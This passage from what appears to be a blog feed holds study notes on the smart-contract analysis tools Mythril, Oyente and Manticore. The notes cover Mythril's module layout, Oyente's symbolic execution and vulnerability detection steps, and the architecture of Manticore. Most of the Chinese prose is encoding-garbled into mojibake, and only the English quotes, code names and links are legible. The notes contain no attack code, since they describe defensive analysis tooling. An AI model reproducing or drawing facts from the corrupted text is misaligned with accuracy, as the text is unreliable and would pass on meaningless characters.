class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn24"><p>æ£€æµ‹ä»åˆ«çš„åŸŸåŒ…å«/æ‰§è¡Œ(å¤–éƒ¨)ä»£ç çš„ç±»å‹<a href="#fnref24"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn25"><p>ä¸“é—¨æ£€æµ‹æƒé™æ§åˆ¶<a href="#fnref25"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn26"><p>æ¼æ´<a href="#fnref26" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn27"><p>å±äºæƒé™æ§åˆ¶<a href="#fnref27" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn28"><p>æ¼æ´<a href="#fnref28" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn29"><p>æ¼æ´<a href="#fnref29" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn30"><p>è°ƒç”¨å¤–éƒ¨åˆçº¦<a href="#fnref30" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn31"><p>è°ƒç”¨å¤–éƒ¨åˆçº¦<a href="#fnref31" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn32"><p>ä¸ fallback å‡½æ•°ç›¸å…³çš„<a href="#fnref32"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mythril ä»£ç åˆ†æ</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/mythril_intro/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/mythril_intro/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆæ­¥äº†è§£">åˆæ­¥äº†è§£</h2><h3 id="æ–‡ä»¶åˆ—è¡¨">æ–‡ä»¶åˆ—è¡¨</h3><ol start="0" type="1"><li><p>requirements.txt æœ¬é¡¹ç›®çš„ä¾èµ–</p></li><li><p><code>setup.py</code> ä¸­çœ‹é¡¹ç›®çš„å¤§è‡´ä¿¡æ¯ã€‚</p><p>å…¶ä¸­ï¼Œå…¥å£ç‚¹ï¼š<code>entry_points=&#123;"console_scripts": ["myth=mythril.interfaces.cli:main"]&#125;,</code>ä¸ºï¼š <code>myth</code> æ–‡ä»¶ è€Œ <code>myth</code> çš„å…¥å£ä¹Ÿå°±æ˜¯ï¼š<code>mythril</code> æ¨¡å—/åŒ…ï¼ˆä¹Ÿå°±æ˜¯æ–‡ä»¶å¤¹ï¼‰ä¸‹é¢çš„<code>interfaces</code> åŒ…çš„ <code>cli.py</code> ä¸­çš„ <code>main</code>å‡½æ•°</p></li><li><p><code>mythril</code> åŒ…æ˜¯æ•´ä¸ªæºç æ–‡ä»¶å¤¹</p><ol type="1"><li><code>interfaces</code> æ˜¯æ¥å£æ–‡ä»¶å¤¹</li><li><code>analysis</code> åˆ†ææ–‡ä»¶å¤¹<ol type="1"><li><code>module</code> å¤„ç†æ¼æ´åˆ†æçš„æ¨¡å—</li></ol></li><li><code>disassembler</code> åæ±‡ç¼–æ¨¡å—</li></ol></li><li><p><code>doc</code> æ˜¯æœ¬é¡¹ç›®ä»‹ç»æ–‡æ¡£çš„æºæ–‡ä»¶</p><p>ä¹Ÿæœ‰åœ¨çº¿ç‰ˆæœ¬ï¼š<ahref="https://mythril-classic.readthedocs.io/en/master/index.html">Welcometo Mythrilâ€™s documentation!</a></p></li></ol><h2 id="å¤§è‡´äº†è§£">å¤§è‡´äº†è§£</h2><ol start="0" type="1"><li><p>æ¨¡å—åŒ–è®¾è®¡</p><p><ahref="https://mythril-classic.readthedocs.io/en/master/module-list.html#modules">MythrilModules</a></p><ol start="0" type="1"><li><p>æ¯ä¸ªæ¨¡å—å¯ä»¥æœ‰ä¸€ä¸ª <code>__init__.py</code>ç”¨äºè¢«å¯¼å…¥æ—¶çš„åˆå§‹åŒ–å·¥ä½œ</p></li><li><p><code>analysis/module</code> package æ˜¯ç”¨æ¥æ£€æµ‹æ¼æ´çš„</p><ol type="1"><li><code>base.py</code> æä¾› <code>DetectionModule</code> åŸºç±»ï¼Œmodulesä¸­å“¥å“¥æ¼æ´æ£€æµ‹æ¨¡å—ç»§æ‰¿è‡ªè¯¥åŸºç±»ã€‚</li><li><code>loadr.py</code> çš„ ModuleLoader ç±»å®ç°äº†ä¸€ä¸ªå•ä¾‹æ¨¡å¼çš„loaderï¼ŒåŠ è½½åŸºç±»ä¸­çš„ <code>EntryPoint</code> ç±»å’Œ<code>DetectionModule</code></li></ol></li><li><p><code>type(module).__name__</code></p><p>çŸ¥è¯†ç‚¹ï¼š <code>type</code> å‘½ä»¤æ—¶ä»€ä¹ˆç±»å‹ï¼Œå¯¹è±¡çš„è¯ï¼Œå°±è¿”å›ç±»åã€‚<code>__name__</code> å±æ€§è¿”å›æ¨¡å—æ–‡ä»¶åã€‚</p><blockquote><p>æ‰€æœ‰çš„æ¨¡å—éƒ½æœ‰ä¸€ä¸ªå†…ç½®å±æ€§ <code>__name__</code> ã€‚ä¸€ä¸ªæ¨¡å—çš„<code>__name__</code> çš„å€¼å–å†³äºæ‚¨å¦‚ä½•åº”ç”¨æ¨¡å—ã€‚å¦‚æœ importä¸€ä¸ªæ¨¡å—ï¼Œé‚£ä¹ˆæ¨¡å—<strong>name</strong>çš„å€¼é€šå¸¸ä¸ºæ¨¡å—æ–‡ä»¶åï¼Œä¸å¸¦è·¯å¾„æˆ–è€…æ–‡ä»¶æ‰©å±•å</p></blockquote></li></ol></li><li><p>è¾“å…¥è¾“å‡º</p><ol type="1"><li><p>è¾“å…¥</p><ol type="1"><li>å¦‚æœè¾“å…¥æ–‡ä»¶ä¸­æœ‰å¤šä¸ªåˆçº¦ï¼Œé»˜è®¤æ£€æµ‹æœ€åä¸€ä¸ªï¼Œå¯ä»¥æŒ‡å®šåˆçº¦åï¼Œå’Œoyenete çš„é‚£ä¸ªåŠŸèƒ½ç±»ä¼¼ã€‚</li><li>è¿˜å¯ä»¥é€šè¿‡æŒ‡å®šåˆçº¦åœ°å€åˆ†æé“¾ä¸ŠåˆåŒã€‚</li><li>æŒ‡å®šè¶…æ—¶æ—¶é—´ã€æœ€å¤§æ·±åº¦ï¼ˆäºŒè€…éƒ½æœ‰é»˜è®¤ï¼‰</li></ol></li><li><p>ç»“æœè¾“å‡º</p><p>æœ‰æ¼æ´çš„ç¼–å·ï¼Œå±å®³ç¨‹åº¦ã€åˆçº¦åã€ä»‹ç»ã€ä½ç½®ç­‰ï¼ŒæŒºå¥½çš„ï¼Œæˆ‘ä»¬å¯ä»¥å­¦ä¹ è¿™ä¸ªæ–¹é¢è¾“å‡ºç±»å‹ã€æ–¹å¼ä¹Ÿå€¼å¾—å­¦ä¹ ï¼šé»˜è®¤ç»ˆç«¯ï¼Œæä¾›å‚æ•°æŒ‡å®šå…¶ä»–æ–¹å¼</p></li></ol></li><li><p>ç±»å‹æç¤º Typing æ¨¡å—</p><p>Pythonå¢å¼ºæè®®(PEP-484)ç­‰ï¼Œå‘ä»£ç ä¸­æ·»åŠ ç±»å‹ä¿¡æ¯çš„æ ‡å‡†æ–¹æ³•ã€‚é™æ€åˆ†æï¼Œä»…ä»…ä¼šåœ¨ä½ ç¼–ç¨‹æ—¶æç¤ºï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼ˆPycharmä¼šæç¤ºï¼‰</p></li></ol><h2 id="ä¸»è¦å†…å®¹">ä¸»è¦å†…å®¹</h2><ol type="1"><li>å…¥å£ç‚¹: <code>mythril.interfaces.cli.main()</code></li></ol><p>å‚è€ƒæ–‡ä»¶ï¼š</p><p><a href="https://www.cnblogs.com/lands-ljk/p/5880483.html">Python<strong>init</strong>.py ä½œç”¨è¯¦è§£</a> <ahref="https://www.jianshu.com/p/73f7fbf75183">Python<strong>init</strong>.py ä½œç”¨è¯¦è§£</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c10/p01_make_hierarchical_package_of_modules.html">10.1æ„å»ºä¸€ä¸ªæ¨¡å—çš„å±‚çº§åŒ…</a></p><p><ahref="https://sikasjc.github.io/2018/07/14/type-hint-in-python/">å…¨é¢ç†è§£Python ä¸­çš„ç±»å‹æç¤ºï¼ˆType Hintsï¼‰</a> <ahref="https://stackoverflow.com/questions/51710037/how-should-i-use-the-optional-type-hint">Howshould I use the Optional type hint?</a> <ahref="https://docs.python.org/3/library/typing.html#typing.Optional">pythontyping doc</a></p><p>[command line interface(CLI)](https://searchwindowsserver.techtarget.com/definition/command-line-interface-CLI#:~:text=A%20command%20line%20interface%20(CLI,interfaces%20and%20character%20user%20interfaces.)</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>oyente ç¬¦å·æ‰§è¡Œå’Œæ£€æµ‹éƒ¨åˆ†ä»£ç åˆ†æ</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/oyente_deeper/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/oyente_deeper/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¦å·æ‰§è¡Œå’Œæ£€æµ‹éƒ¨åˆ†">ç¬¦å·æ‰§è¡Œå’Œæ£€æµ‹éƒ¨åˆ†</h1><h2 id="oyente.symexecrun">oyente.symExec:run</h2><p>å‰é¢è®²åˆ° oyente.oyente:analyze_bytecode ä¸­ä¸º symExec.runä¼ å…¥åæ±‡ç¼–æ–‡ä»¶ï¼Œè¿›è¡Œåç»­æ“ä½œã€‚</p><p>åœ¨ä¸æ˜¯ <code>is_testing_evm</code> æµ‹è¯• evmçš„æƒ…å†µä¸‹ï¼Œå…³é”®å‡½æ•°æœ‰ä»¥ä¸‹ä¸‰ä¸ªï¼š<code>analyze()ã€ detect_vulnerabilities()ã€closing_message()</code></p><h3 id="oyente.symexecanalyze">oyente.symExec:analyze</h3><p>å¥½å¤šå‡½æ•°ä¸­éƒ½æœ‰ä¸€ä¸ªå‡½æ•°å†…çš„åµŒå¥—å‡½æ•°å®šä¹‰ï¼š <code>timeout_cb()</code> ,å…¶å†…å®¹ä¸º DEBUG mode æ—¶çš„ traceback<a href="#fn1" class="footnote-ref"id="fnref1"role="doc-noteref"><sup>1</sup></a>ï¼Œä½œç”¨ï¼šä¾¿äºè°ƒè¯•æ—¶ï¼Œä¸€å±‚å±‚æ˜¾ç¤ºä¿¡æ¯ã€‚Psï¼š è¿™é‡Œè¿˜ä½¿ç”¨çš„æ˜¯åµŒå¥—å‡½æ•°ï¼Œ</p><p><ahref="https://blog.csdn.net/u011012932/article/details/73864242">PythonåµŒå¥—å‡½æ•°</a> <a href="https://www.pynote.net/archives/1178">åœ¨ Pythonå‡½æ•°ä¸­å®šä¹‰åµŒå¥—å‡½æ•°</a></p><p><code>analyze()</code> å‡½æ•°çš„ä½œç”¨æ—¶ï¼Œç”Ÿæˆ CFG æ§åˆ¶æµå›¾ï¼Œå¹¶åˆ†æ<code>run_build_cfg_and_analyze</code> ï¼Œå¦‚æœ‰å¼‚å¸¸ï¼Œåˆ™æŠ›å‡ºã€‚è€Œ<code>run_build_cfg_and_analyze</code> å‡½æ•°ä¸­</p><ol type="1"><li><p><code>initGlobalVars()</code></p><ol type="1"><li><p>åˆå§‹åŒ–çº¦æŸæ±‚è§£å™¨ï¼Œè®¾ç½®è¶…æ—¶<a href="#fn2" class="footnote-ref"id="fnref2" role="doc-noteref"><sup>2</sup></a></p><ol type="1"><li><p>å¦‚æœæ˜¯å¹¶è¡Œçš„è¯ï¼Œè®¾ç½®simplifyï¼ˆç®€åŒ–ï¼‰ã€solve-eqsï¼ˆé«˜æ–¯æ¶ˆå…ƒï¼‰ã€smtï¼ˆæä¾›ä¸€ä¸ªåŸºäº SMT çš„solverï¼‰ç­–ç•¥ï¼Œè¿˜ä¼šæŠŠ goal åˆ†è§£æˆå­ goal</p><p>ParThenï¼šReturn a tactic that applies t1 and then t2 to every subgoalproduced by t1. The subgoals are processed in parallel. The tacticsplit-clause will select a clause (or f_1 ... f_n) in the input goal,and split it n subgoals.</p><ul class="task-list"><li><label><input type="checkbox" />tseitin-cnf-core è²Œä¼¼å’Œ tseitin-likeencodingã€è¾“å…¥ç®€åŒ–æœ‰å…³ï¼Ÿ çœ‹äº†è‹±æ–‡ä¹Ÿä¸æ¸…æ¥šã€‚</label></li></ul></li><li><p>å¦‚æœåæ±‡ç¼–æ–‡ä»¶ä¸­æœ‰ MSIZEï¼Œåˆ™å°†å¯¹åº”æ ‡å¿—è®¾ç½®ä¸º True</p><ul class="task-list"><li><label><input type="checkbox" />ä¸ºä»€ä¹ˆè¿™æ ·åšå‘€ï¼Ÿ</label></li></ul><p>MSIZE ä¸ºæ“ä½œç ä¹‹ä¸€ï¼Œå«ä¹‰ä¸ºï¼šsize of memory, i.e. largest accessedmemory indexã€‚ <ahref="https://solidity.readthedocs.io/en/v0.4.24/assembly.html#opcodes">0.4.24çš„ opcode åˆ—è¡¨</a></p></li></ol></li><li><p>åˆå§‹åŒ– explorer ç›¸å…³</p><p>å¤§è‡´æœ‰ä¸€ä¸‹ï¼ˆæ²¡å†™å…¨ï¼‰ï¼š | å˜é‡ | å«ä¹‰| |----|---| |<code>visited_pcs</code> | è®¿é—®è¿‡çš„è·¯å¾„çš„é›†åˆ| | <code>vertices</code>|é¡¶ç‚¹å­—å…¸| | <code>edges</code> |è¾¹å­—å…¸| | <code>visited_edges</code>|è®¿é—®è¿‡çš„è¾¹çš„å­—å…¸| | <code>calls_affect_state</code> | callå½±å“çš„çŠ¶æ€ï¼Ÿä¸å¤ªæ¸…æ¥š| | <code>money_flow_all_paths</code> | é‡‘é’±æµåˆ—è¡¨|| <code>reentrancy_all_paths</code> | é‡å…¥æµåˆ—è¡¨| |<code>path_conditions</code> | è·¯å¾„æ¡ä»¶åˆ—è¡¨| |<code>global_problematic_pcs</code> | æ£€æµ‹çš„æ¼æ´çš„åˆ—è¡¨ç»„æˆçš„å­—å…¸|</p><p>ç¬¦å·å˜é‡çš„åå­—ç”Ÿæˆå™¨ è¿˜æœ‰ USE_GLOBAL_BLOCKCHAIN:æ˜¯å¦ä½¿ç”¨åŒºå—é“¾å…¨å±€çŠ¶æ€ å’Œ REPORT_MODEï¼šæ˜¯å¦ç”ŸæˆæŠ¥å‘Š</p><p>instructions: capturing all the instructions, keys are correspondingaddresses</p></li></ol></li><li><p><code>build_cfg_and_analyze()</code></p><ol type="1"><li><p>timeout to run symbolic execution</p><p>åœ¨ <code>global_params.py</code> ä¸­å®šä¹‰çš„<code>GLOBAL_TIMEOUT = 50</code> ,å¦‚æœè¶…æ—¶ï¼Œåˆ™æ ‡è®°è¶…æ—¶ï¼Œä¸”æŠ›å‡ºè¶…æ—¶å¼‚å¸¸</p></li><li><p><code>change_format()</code> æ•´ç†ã€ç®€åŒ–åæ±‡ç¼–æ–‡ä»¶çš„æ ¼å¼</p><ol type="1"><li>æ›¿æ¢ä¸€äº› evm æœªå®ç°çš„åæ±‡ç¼–ä¸ºæŒ‡ä»¤</li><li>ç®€åŒ–æ¯ä¸€è¡Œ <code>00002: PUSH1 0x80</code> å˜æˆ<code>2 PUSH1 =&gt; 0x80</code></li><li>ç„¶åå†™å›åæ±‡ç¼–æºæ–‡ä»¶</li></ol></li><li><p>è¯»å–ä¸Šä¸€æ­¥å¤„ç†å¥½çš„åæ±‡ç¼–æ–‡ä»¶ï¼Œå¹¶å»é™¤é¦–è¡Œ runtimecode</p></li><li><p>tokenize æ¨¡å—æä¾›è¯­æ³•ã€è¯­ä¹‰æ‰«æè§£æ<a href="#fn3"class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p><p>it breaks a stream of bytes into Python tokens. It decodes the bytesaccording to PEP-0263 fordetermining source file encoding</p></li><li><p><code>collect_vertices</code> è²Œä¼¼çœ‹ä¸å¤ªæ‡‚ï¼Ÿ</p><ol type="1"><li>Parse the disassembled file</li><li>Then identify each basic block (i.e. one-in, one-out)</li><li>Store them in vertices</li></ol></li><li><p><code>construct_bb</code> æ„å»ºåŸºæœ¬å—</p></li><li><p><code>construct_static_edges</code> æ„å»ºé™æ€è¾¹</p></li><li><p><code>full_sym_exec</code> ç¬¦å·æ‰§è¡Œæ£€æµ‹</p><ol type="1"><li><p><code>get_init_global_state</code> åˆå§‹åŒ–å½“å‰çŠ¶æ€</p><p>global_state æœ‰è°ƒç”¨ä¸è¢«è°ƒç”¨è€…ä½™é¢ï¼Œ<code>global_state["balance"]["Is"æˆ–"Ia"]</code>ï¼Œpcï¼ˆç¨‹åºè®¡æ•°å™¨)ï¼Œæ¥å—å’Œå‘é€è€…åœ°å€ï¼Œæ—¶é—´æˆ³ç­‰</p></li><li><p><code>init_analysis</code> åˆå§‹åŒ–åˆ†æç›¸å…³å‚æ•°</p></li><li><p>åˆ›å»º params å¯¹è±¡ï¼Œè€Œä¸”æŠŠä¸Šä¸¤æ­¥çš„å…¨å±€çŠ¶æ€å’Œ analysiså¯¹è±¡å¢åŠ ä¸ºè¯¥å¯¹è±¡çš„å±æ€§ã€‚</p></li></ol></li><li><p><code>sym_exec_block</code> ç¬¦å·æ‰§è¡Œå—ï¼Œ æ˜¯ä¸ªé€’å½’</p><ol type="1"><li><p>è®¡æ•°å’Œæ£€æŸ¥æœ€å¤§è¾¹ç•Œ</p><ol type="1"><li>å¯¹ current_edge çš„è®¿é—®æ¬¡æ•°è®¡æ•°</li><li>åˆ¤æ–­ current_edge è®¿é—®æ¬¡æ•°æ˜¯å¦è¶…è¿‡ LOOP_LIMITï¼Œå¦‚æœè¶…è¿‡ï¼Œåˆ™è¿”å›stack - [ ] è¿™é‡Œä¸ºä»€ä¹ˆè¦è¿”å› stack</li><li>åˆ¤æ–­ä½¿ç”¨çš„ gas æ˜¯å¦è¶…è¿‡ GAS_LIMITï¼Œå¦‚æœè¶…è¿‡ï¼Œåˆ™è¿”å› stack</li></ol></li><li><p>æ‰§è¡Œå—ä¸­çš„æŒ‡ä»¤</p><p>å¾ªç¯éå†å—çš„æŒ‡ä»¤åˆ—è¡¨ï¼Œæ¯æ¬¡æ‰§è¡Œä¸€æ¡ï¼Œæ‰§è¡ŒæŒ‡ä»¤è°ƒç”¨ï¼š<code>sym_exec_ins()</code></p></li><li><p>å°†å½“å‰å—æ ‡è®°ä¸ºå·²è®¿é—®</p></li><li><p>æ¼æ´è·¯å¾„æ›´æ–°</p><ul class="task-list"><li><label><input type="checkbox" />è¿™é‡Œè¿˜æ²¡æœ‰çœ‹æ‡‚</label></li></ul><p>å°†è·¯å¾„åŠ å…¥é‡å…¥æ¼æ´è·¯å¾„ï¼Ÿï¼ˆæ€ä¹ˆå°±ç›´æ¥åŠ å…¥äº†ï¼Œå“ªé‡Œæ£€æµ‹äº†ï¼Ÿï¼‰ å¦‚æœå½“å‰money_flow è·¯å¾„åœ¨å…¨éƒ¨ money æ¼æ´ä¸­ä¸å­˜åœ¨ï¼Œåˆ™æ›´æ–°ç›¸å…³è·¯å¾„ã€‚</p></li><li><p>Go to next Basic Block(s)</p><p>æ ¹æ®è·³è½¬ç±»å‹ï¼Œé€‰æ‹©å—ï¼Œç„¶åæ›´æ–°ç›¸å…³æ¡ä»¶ï¼Œç„¶åé€’å½’ã€‚ è·³è½¬ç±»å‹ï¼š<code>terminalã€unconditionalã€falls_toã€conditional</code></p><pre><code>1. ç»ˆæ­¢ç±»å‹æˆ–è€…æ·±åº¦è¶…è¿‡ DEPTH_LIMITï¼Œåˆ™ç»ˆæ­¢è¯¥è·¯å¾„ï¼Œå¹¶ display_analysis money flowç›¸å…³ï¼Ÿ - [ ] ä¸ºä»€ä¹ˆ2. æ— æ¡ä»¶ï¼Œåˆ™æ›´æ–°ç›¸å…³å‚æ•°ï¼Œç„¶åç›´æ¥è·³è½¬3. follow to çš„åŒä¸Š4. æœ‰æ¡ä»¶è·³è½¬    é‡‡ç”¨ DFS æ·±åº¦ä¼˜å…ˆæœç´¢é€’å½’éå†    å…ˆæ£€æŸ¥å·¦èŠ‚ç‚¹ï¼Œå¦‚æœçº¦æŸæœ‰è§£ï¼Œåˆ™å‘å·¦é€’å½’ï¼Œç›´åˆ°å¶å­èŠ‚ç‚¹ï¼Œç„¶åå›é€€ä¸€ä¸ªèŠ‚ç‚¹ï¼Œèµ°å³è¾¹èŠ‚ç‚¹ï¼Œè‹¥çº¦æŸæœ‰è§£ï¼Œåˆ™è¿›å…¥å³è¾¹èŠ‚ç‚¹ã€‚</code></pre></li></ol></li><li><p>sym_exec_ins ç¬¦å·æ‰§è¡ŒæŒ‡ä»¤</p><p>æ¨¡æ‹Ÿæ‰§è¡ŒæŒ‡ä»¤ opcode</p><ul class="task-list"><li><label><inputtype="checkbox" />ä¸çŸ¥é“ç”±äºç‰ˆæœ¬æ›´æ–°ï¼Œå˜åŒ–äº†æ²¡ï¼Ÿ</label></li></ul></li></ol></li><li><p>detect_vulnerabilities instruction æ˜¯ä¸€ä¸ªä»¥<code>&#123;æŒ‡ä»¤åœ°å€:æŒ‡ä»¤&#125;</code>çš„å­—å…¸</p><ol type="1"><li>è®¡ç®—ä»£ç è¦†ç›–ç‡ï¼Œevm_code_coverage</li><li>åˆ†åˆ«æ£€æµ‹æ¼æ´ï¼Œå°†ç»“æœæ”¾å¦‚ result äºŒç»´åˆ—è¡¨</li><li>vulnerability_found æ²¡æœ‰çœ‹æ‡‚</li></ol></li><li><p>closing_message åˆ†æç»“æŸï¼Œæ ¹æ®å…¨å±€å˜é‡ STORE_RESULTè§‰å¾—é‚£ä¸ªæ˜¯å¦å­˜å‚¨åˆ†æç»“æœã€‚</p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p><ahref="https://ahuigo.github.io/b/py/py-debug#/">py-debug</a> <ahref="https://blog.csdn.net/John_xyz/article/details/80148431">pythonä½¿ç”¨ traceback è·å–å¼‚å¸¸ä¿¡æ¯</a><a href="#fnref1" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn2"><p><a href="https://rise4fun.com/z3/tutorial/strategies">Z3- strategies</a> <ahref="https://z3prover.github.io/api/html/z3py_8py.html">z3py.py FileReference</a> <ahref="https://www.twblogs.net/a/5b89ecef2b71775d1ce48484">Z3 Solver ä¸­Tactic çš„ä½¿ç”¨</a><a href="#fnref2" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn3"><p><ahref="https://docs.python.org/3/library/tokenize.html">tokenize â€”Tokenizer for Python source</a> <ahref="https://cloud.tencent.com/developer/section/1369385">tokenize â€”Tokenizer for Python source ä¸­æ–‡</a> <ahref="https://zhuanlan.zhihu.com/p/29815903">ç”¨ Python ç¼–å†™ JSONè§£æå™¨çš„æ¦‚è¿°</a><a href="#fnref3" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>manticore è®ºæ–‡é˜…è¯»å·¥å…·</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/paper_manticore/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/paper_manticore/</url>
      
        <content type="html"><![CDATA[<h2 id="background-and-contribution">Background and Contribution</h2><h3 id="background">Background</h3><p>Symbolic execution has been extensively researched in a securitycontext, but industry has been slow to adopt the technique: Symbolicexecution</p><ol type="1"><li>Lack of flexible, user-friendly tools.</li><li>Existing frameworks are tightly coupled to traditional executionmodels, which makes symbolic execution research challenging foralternative execution environments, such as the Ethereum platform.</li></ol><h3 id="contribution">Contribution</h3><p>Manticore is a symbolic execution framework for analyzing<strong>binaries and smart contracts.</strong></p><p>Imporvements:</p><ol type="1"><li>highly flexible</li><li>supports both traditional computing environments (x86/64, ARM) andexotic ones, such as the Ethereum platform</li></ol><h2 id="architecture">Architecture</h2><p><strong>The primary components</strong> are the <strong>CoreEngine</strong> and <strong>Native</strong> and <strong>EthereumExecution Modules.</strong> <strong>Secondary components</strong>include the Satisfiability Module Theories (SMT-LIB) module, EventSystem, and API.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200502101231.png"alt="manticore Architecture" /><figcaption aria-hidden="true">manticore Architecture</figcaption></figure><h3 id="core-engine">Core Engine</h3><p>æ ¸å¿ƒå¼•æ“æ˜¯ Manticore çµæ´»æ€§çš„æ¥æºã€‚å®ƒå®ç°äº†ä¸€ä¸ªä¸å¹³å°æ— å…³çš„é€šç”¨ç¬¦å·æ‰§è¡Œå¼•æ“ï¼Œè¯¥å¼•æ“å¯¹åŸºç¡€æ‰§è¡Œæ¨¡å‹å‡ ä¹æ²¡æœ‰ä»»ä½•å‡è®¾ã€‚è¯¥æ ¸å¿ƒå¼•æ“æ ¹æ®å›¾1a æ‰€ç¤ºçš„çŠ¶æ€ç”Ÿå‘½å‘¨æœŸæ¥æ“ä½œå’Œç®¡ç†ç¨‹åºçŠ¶æ€ã€‚</p><p>ç¨‹åºçŠ¶æ€æ˜¯æŠ½è±¡å¯¹è±¡ï¼Œä»£è¡¨æ‰§è¡Œæ—¶æŸä¸ªç‚¹çš„ç¨‹åºçŠ¶æ€ã€‚è¿™äº›å¯¹è±¡å…¬å¼€äº†ä¸€ä¸ªæ‰§è¡Œæ¥å£ï¼ŒCore Engineè°ƒç”¨è¯¥æ‰§è¡Œæ¥å£æ¥è§¦å‘ç¨‹åºæ‰§è¡Œçš„ä¸€ä¸ªåŸå­å•å…ƒã€‚å¯¹äºæœ¬æœºäºŒè¿›åˆ¶æ–‡ä»¶å’Œä»¥å¤ªåŠï¼Œè¿™æ˜¯ä¸€æ¡æŒ‡ä»¤ã€‚åœ¨æ‰§è¡ŒæœŸé—´ï¼ŒçŠ¶æ€å¯èƒ½ä¼šä¸­æ–­å¹¶è¿”å›ç»™ CoreEngineï¼Œä»¥è¡¨æ˜éœ€è¦å¤„ç†ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ã€‚å¦‚å›¾ 1b æ‰€ç¤ºï¼Œ</p><h4 id="çŠ¶æ€è½¬æ¢">çŠ¶æ€è½¬æ¢</h4><p>çŠ¶æ€ç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸‰ä¸ªçŠ¶æ€ï¼šå°±ç»ªï¼Œå¿™ç¢Œå’Œå·²ç»ˆæ­¢ä»¥åŠä¸¤ä¸ªäº‹ä»¶ï¼šç»ˆæ­¢å’Œå…·ä½“åŒ–ã€‚æ ¸å¿ƒå¼•æ“åå¤é€‰æ‹©å°±ç»ªçŠ¶æ€å¹¶æ‰§è¡Œï¼ˆå°†å…¶è½¬æ¢ä¸ºç¹å¿™ï¼‰ã€‚ æ­£åœ¨æ‰§è¡Œçš„ â€œå¿™ç¢Œâ€çŠ¶æ€å¯ä»¥è½¬æ¢å›â€œå°±ç»ªâ€çŠ¶æ€ï¼Œä¹Ÿå¯ä»¥å‘å‡ºç”Ÿå‘½å‘¨æœŸäº‹ä»¶ä¾›å†…æ ¸å¤„ç†ã€‚</p><p>å½“çŠ¶æ€ç»“æŸæ—¶ï¼ˆé€šå¸¸åœ¨ç¨‹åºé€€å‡ºæˆ–å†…å­˜è®¿é—®å†²çªæ—¶ï¼‰å°†çŠ¶æ€è½¬æ¢ä¸º â€œå·²ç»ˆæ­¢â€æ—¶ï¼Œå°†å‘ç”Ÿ â€œTerminationâ€ äº‹ä»¶ã€‚</p><p>â€œConcretizationâ€å‘ç”Ÿåœ¨ä¸€ä¸ªçŠ¶æ€å‘å‡ºä¿¡å·ï¼Œè¡¨ç¤ºä¸€ä¸ªç¬¦å·å¯¹è±¡åº”è¯¥è½¬æ¢ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªå…·ä½“çš„å€¼ï¼Œå—åˆ¶äºè¯¥çŠ¶æ€çš„å½“å‰çº¦æŸã€‚å¯¹äºæ¯ä¸ªå…·ä½“å€¼ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å­çŠ¶æ€å¹¶å°†å…¶æ ‡è®°ä¸ºâ€œå°±ç»ªâ€ã€‚ å½“ç¨‹åºè®¡æ•°å™¨å¯„å­˜å™¨æˆä¸ºç¬¦å·å¹¶å…·ä½“åŒ–ä¸ºå¯èƒ½çš„å…·ä½“å€¼æ—¶ï¼Œå°±ä¼šå‘ç”Ÿâ€œConcretizationâ€ æœ€å¸¸è§çš„ä¾‹å­ï¼Œå«åšåˆ†å‰ã€‚è¿™å¯¼è‡´ä¸ºæ¯ä¸ªæ–°ç¨‹åºè·¯å¾„ç”Ÿæˆæ–°çŠ¶æ€ã€‚</p><p>å¯ä»¥ä½¿ç”¨å„ç§ç­–ç•¥æ¥è‡ªå®šä¹‰çŠ¶æ€æ¢ç´¢ï¼Œè¿™äº›ç­–ç•¥å®ç°äº†é’ˆå¯¹å°±ç»ªçŠ¶æ€é€‰æ‹©å’Œå…·ä½“åŒ–ï¼ˆReadystate selection and Concretizationï¼‰çš„å„ç§å¯å‘å¼æ–¹æ³•ã€‚æ ¸å¿ƒå¼•æ“æ˜¯ä¸ºå¹¶è¡Œæ€§è€Œè®¾è®¡çš„ï¼Œå¹¶æ”¯æŒç”¨äºçŠ¶æ€é˜Ÿåˆ—å¤„ç†çš„å¤šä¸ªè¿›ç¨‹ã€‚</p><h3 id="ethereum-execution-modules">Ethereum Execution Modules</h3><p>å› ä¸º the Core Engine æ˜¯é«˜åº¦è§£è€¦åˆçš„ï¼Œå› æ­¤ adding Ethereum support didnot require substantial architectural changes to 